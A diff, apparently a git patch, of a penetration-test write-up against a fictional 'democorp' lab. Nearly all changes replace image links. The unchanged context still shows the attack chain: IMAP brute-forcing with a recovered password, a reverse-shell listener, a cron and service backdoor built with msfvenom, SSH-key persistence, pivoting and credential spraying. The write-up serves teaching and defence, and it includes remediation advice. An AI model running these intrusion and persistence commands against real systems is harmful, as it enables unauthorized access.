@@ -26,7 +26,7 @@ The **penetration test report** can be downloaded [here](https://baycode.eu/file
 
 The layout of the infrastructure looks like on the following diagram:
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/diagram.png)
+![](images/images4.jpg)
 
 <div id="0x01"></div>
 
@@ -43,15 +43,15 @@ https://democorp.webflow.io
 
 What information can we gather from the website? Our prime target is "About" page.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/1-1.png)
+![](images/images5.jpg)
 
 After opening "About" page, we are presented with employees and their names.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/2.png)
+![](images/images6.jpg)
 
 This is perfect from attacker perspective, as we can compose a potential username list.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/55.png)
+![](images/images7.jpg)
 
 At the end of the webpage we can see, that the webmaster's e-mail follows format
 
@@ -92,14 +92,14 @@ At first the most optimal approach is to scan for hosts, then for open ports, an
 nmap -sS -T5 <hostname>
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/1-2.png)
+![](images/images8.jpg)
 
 We can see, that the e-mail ports are open, so presumably, this is a mailbox server.
 
 ```
 nmap -sV -sC -T5 -p <ports> <host>
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/09/2-1.png)
+![](images/images9.jpg)
 
 Service and script scan reveals more information about the host, the operating system, and the versions of services running.
 
@@ -133,7 +133,7 @@ Let's move on to brute-forcing.
 hydra -L <user-list> <password-list> <host> <protocol> -I
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/4.png)
+![](images/images10.jpg)
 
 ## Password retrieved
 
@@ -142,7 +142,7 @@ The user j.arnold@democorp.com had the password:
 F4ll2023!
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/10/avatars-gB5PgDJvCbfo8Hz6-pv6noA-t500x500.jpg)
+![](images/images11.jpg)
 
 What is more concerning apart from weak password policy is that approach of interfering directly with IMAP **bypasses multi-factor authentication** completely in case there was a RoundCube panel for example.
 
@@ -175,7 +175,7 @@ Lower, uppercase letters, special characters, numbers, sentences, 15 characters 
 
 We gained access to the mailbox, now let's review the contents for unsecured credentials (https://attack.mitre.org/techniques/T1552/008/) or information disclosure (https://cwe.mitre.org/data/definitions/200.html) findings.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/22.png)
+![](images/images12.jpg)
 
 After logging in, we found an e-mail from p.richardson@democorp.com stating that there is a proof of concept API endpoint set up on the mailbox, and that he attaches the source code for it.
 
@@ -183,28 +183,29 @@ We just found a **Source Code Disclosure** ([link](https://portswigger.net/kb/is
 
 Let's download the source code and review it locally, and then craft a possible 0-day exploit.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/1-4.png)
+![](images/images13.jpg)
 
 ## Source code disclosure
 
 After opening the source code, we are presented with a Node.js API application retrieving the current employee of the month.
 
 `index.js`
-![](http://news.baycode.eu/wp-content/uploads/2023/09/6b.png)
+![](images/images14.jpg)
 In the index.js, we can see, that there is a middleware for validation, JSON requests, and that there are a few callbacks imported from a controller.
 
 `controllers/employee-of-the-month-controller.js`
-![](http://news.baycode.eu/wp-content/uploads/2023/09/43.png)
+
+![](images/images15.jpg)
 
 We can see a couple of methods in the controller, `updateProfile` is updating the data for current employee of the month, and `refreshBadge` is regenerating the badge using ffmpeg command. Seems like the author had tried to keep it safe from command injection.
 
 `current-badge.png`
-![](http://news.baycode.eu/wp-content/uploads/2023/09/3232.png)
+![](images/images16.jpg)
 
 The ffmpeg is creating a badge containing firstname and lastname of the employee of the month.
 
 `utils/utilities.js`
-![](http://news.baycode.eu/wp-content/uploads/2023/09/3213.png)
+![](images/images17.jpg)
 The utilities.js contains two exported functions, one for deep merging the object, another one for sanitizing the possible command injection.
 ### Based on that information, I will present two vulnerabilities. Let's start with less obvious one.
 
@@ -213,7 +214,7 @@ The utilities.js contains two exported functions, one for deep merging the objec
 # 0x04 Prototype Pollution
 <a href="#0x03"><button class="nav-btn">Previous chapter</button></a><a href="#0x05"><button class="nav-btn">Next chapter</button></a>
 
-![](http://news.baycode.eu/wp-content/uploads/2023/10/2qum0u.jpg)
+![](images/images18.jpg)
 
 Prototype pollution is a type of deserialization vulnerability that affects JavaScript application (server and client side) and other programming languages, such as Python. It occurs, when attacker manipulates the prototype (`__proto__`) of an object (let's say it is a template for other objects, which inherit the properties from the prototype), effectively poisoning it, the properties that did not exist on newly created objects now do exist. 
 
@@ -252,7 +253,7 @@ exports.updateProfile = (req, res) => {
 
 The controller calls `merge` function in the updateProfile method.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/8.png)
+![](images/images19.jpg)
 
 The merge function is creating an object `{}`, and then unsafely merging the properties - iterating on everything, even `__proto__`, and assigning it inside, effectively polluting every newly created object in the application. This example is based on a real world library available in the npm repository that I found (https://github.com/mvoorberg/x-assign), all it takes to pollute your application is one invocation of this function with a payload, so if you use it -  immediate removal is advised. 
 
@@ -442,7 +443,7 @@ nc -lvnp 31337
 python3 -m http.server
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/32323.png)
+![](images/images20.jpg)
 
 ## Boom, we received a reverse shell.
 
@@ -499,7 +500,7 @@ Let me show you another vulnerability that was found here.
 
 Command injection? Wasn't that sanitized? Yes, but the developer employed a blocklist and thought so too, but overlooked the possible syntax.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/2-2.png)
+![](images/images21.jpg)
 
 While it would stop a payload such like this:
 ```bash
@@ -560,7 +561,7 @@ def exploit():
 exploit()
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/323233.png)
+![](images/images22.jpg)
 We once again received a reverse shell. Please notice the difference in /proc/self/environ compared to previous one.
 
 ## How to prevent command injection?
@@ -588,7 +589,7 @@ Never attempt to sanitize input by escaping shell metacharacters. In practice, t
 
 ## Back to the story, let's run the exploit against the target server and continue.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/1-6.png)
+![](images/images23.jpg)
 
 After running the exploit, we've compromised the first machine. This machine is going to be our pivot into the internal domain. The important thing to do now, is to establish persistence, so we are not too easy to get shaken off of the machine.
 
@@ -605,7 +606,7 @@ Our next step is to create a rogue SSH key for persistence.
 ssh-keygen
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/2-4.png)
+![](images/images24.jpg)
 
 After creating the key, we should add the public part of the key into `authorized_keys`  file and copy the private part into our machine.
 ```bash
@@ -613,7 +614,7 @@ cat id_rsa.pub >> authorized_keys
 cat id_rsa
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/3-1.png)
+![](images/images25.jpg)
 
 Now it is time to log into the SSH service, delete the created keys, and kill the reverse shell. It is important to kill the reverse shell only after we've established another control channel.
 
@@ -622,7 +623,7 @@ ssh -i <user>@<ip>
 rm .ssh/id_rsa .ssh/id_rsa.pub
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/4-2.png)
+![](images/images26.jpg)
 
 ## Persistence via malware
 
@@ -633,7 +634,7 @@ msfvenom -a 64 -p <payload> -f <binary type> LPORT=<port> -o <name>
 scp -i <key> <file> <user>@<ip>:
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/5-1.png)
+![](images/images27.jpg)
 
 ## Crontab
 
@@ -644,14 +645,16 @@ mv node-builder ./.config/.node/
 cd ./.config/.node
 chmod 755 node-builder
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/09/6-1.png)
+
+![](images/images28.jpg)
 
 After uploading the backdoor, our next step is to create a crontab entry to run it each 8 hours.
 ```bash
 crontab -e
 0 8 * * * /home/node-api/.config/.node/node-builder
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/09/7-1.png)
+
+![](images/images29.jpg)
 
 ## User Service
 
@@ -678,7 +681,7 @@ systemctl --user enable node-build
 systemctl --user start node-build
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/8-2.png)
+![](images/images30.jpg)
 
 By starting the service we've executed the Meterpreter and set up a listener to connect to. We can now connect to the backdoor and test if it works.
 
@@ -691,7 +694,7 @@ set LPORT <port>
 exploit
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/9.png)
+![](images/images31.jpg)
 
 The backdoor works. Our next step is to make our way into the internal domain.
 
@@ -707,7 +710,7 @@ After establishing persistence, lets check what other networks the mail server h
 ip route
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/10.png)
+![](images/images32.jpg)
 
 ## Pivoting
 
@@ -717,7 +720,7 @@ As we can see, there is 10.10.24.0/24 network available. Let's continue with piv
 sshuttle -r user@ip <network CIDR> --ssh-cmd "ssh -i <key>" -v
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/11.png)
+![](images/images33.jpg)
 
 ## Port scanning
 
@@ -727,7 +730,7 @@ After establishing the pivot, our next step is to upload a port scanner onto the
 meterpreter > upload src dst
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/12.png)
+![](images/images34.jpg)
 
 For port scanning I decided to go with a compiled NimScan (https://github.com/elddy/NimScan) binary. The ports defined are ports specific for a Windows operating system.
 
@@ -750,7 +753,7 @@ For port scanning I decided to go with a compiled NimScan (https://github.com/el
 **5357** - WINRM - a protocol used for remote management and task automation. Example clients - PSSessions, Evil-WINRM.
 
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/13.png)
+![](images/images35.jpg)
 
 After the port scan we discovered a few machines - one of them has LDAP port open. We add them to our asset notes, and now the enumeration begins again. Let's check if we've discovered a domain controller.
 
@@ -758,7 +761,7 @@ After the port scan we discovered a few machines - one of them has LDAP port ope
 ldapsearch -LLL -x -H ldap://10.10.24.250 -b '' -s base '(objectclass=*)'
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/15a.png)
+![](images/images36.jpg)
 
 We discovered the Domain Controller - `10.10.24.250` - democorp-dc@democorp.com. It is time to gather information about users.
 
@@ -778,7 +781,7 @@ p.richardson@democorp.com
 ./kerbrute userenum --dc <dc-ip> <userslist> -d <domain>
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/14.png)
+![](images/images37.jpg)
 
 The users scraped from website do in fact exist on the domain. The next step is to check for possible **credential stuffing** using the asset we gathered in the beginning - valid mailbox credentials, specifically for the `j.arnold` user and his `F4ll2023!` password, and pass it on to SMB authentication against all of the machines gathered from port scan. (https://attack.mitre.org/techniques/T1078/)
 
@@ -792,7 +795,7 @@ The users scraped from website do in fact exist on the domain. The next step is 
 crackmapexec smb -u <user> -p <password> -d <domain> <hosts>
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/09/15.png)
+![](images/images38.jpg)
 
 ## Access granted
 
@@ -807,6 +810,7 @@ Password reuse refers to the practice of using the same password across multiple
 This phenomenon poses a significant security risk as it increases the potential impact of a compromised password. If an attacker successfully obtains a password from one account, they can attempt to use it to gain unauthorized access to other accounts associated with the same password. In this case, the obtained user password for the e-mail box was reused on the domain.
 
 A reminder - to figure out whether your public service account information has been compromised in such a manner, you can utilize the following resource: [https://haveibeenpwned.com/](https://haveibeenpwned.com/)
+
 ## What is the risk assessment for that?
 
 **Likelihood**
@@ -827,6 +831,7 @@ Lower, uppercase letters, special characters, numbers, sentences, 15 characters 
 <div id="0x08"></div>
 
 # 0x08 To be continued
+
 <a href="#0x07"><button class="nav-btn">Previous chapter</button></a>
 
 We've reached the end of part one, where we talked about gaining access to the domain. Now, in the next part, we're going to explore what happens when someone tries to take control of the Active Directory network. We'll look at how these attacks happen and why it's crucial to protect the network.
